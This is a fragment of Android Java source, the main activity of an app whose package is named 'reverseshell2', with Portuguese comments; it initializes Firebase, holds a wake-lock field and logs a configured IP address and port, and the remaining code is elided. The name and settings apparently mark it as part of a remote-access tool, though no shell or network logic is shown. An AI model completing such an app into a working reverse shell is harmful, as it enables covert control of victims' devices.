package com.example.reverseshell2;

import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;

import com.google.firebase.FirebaseApp; // Adicione esta importação

public class MainActivity extends AppCompatActivity {

    Activity activity = this;
    Context context;
    static String TAG = "MainActivityClass";
    private PowerManager.WakeLock mWakeLock = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        overridePendingTransition(0, 0);
        context=getApplicationContext();
        // Inicialize o Firebase aqui
        FirebaseApp.initializeApp(context);

        Log.d(TAG, config.IP + "\t" + config.port);

        // ... (restante do código) ...
    }
}

